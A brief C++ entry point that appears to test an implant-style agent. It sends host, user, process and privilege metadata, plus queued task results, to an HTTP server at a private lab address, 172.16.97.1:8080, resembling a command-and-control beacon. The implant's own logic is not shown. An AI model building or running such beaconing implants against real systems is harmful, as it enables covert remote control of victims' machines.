#include "HTTPCommunicationModule.h"
#include <iostream>
#include <string>
#include <thread>
#include "Agent.h"


int main()
{
	
	AgentMetadata metadata = {
		1,
		"hostname",
		"username",
		"processname",
		1337,
		"integrity",
		"arch"
	};
	
	Agent agent = Agent(metadata);

	TaskResult result = { 1, "Task completed successfully" };
	TaskResult result2 = { 2, "Another task completed" };

	agent.addResult(result);
	agent.addResult(result2);

	std::thread thread(&Agent::Work, &agent);
	thread.detach();

	HTTPCommunicationModule* comm = new HTTPCommunicationModule("172.16.97.1", 8080, agent);
	comm->Config();
	comm->Start();

	return 0;
}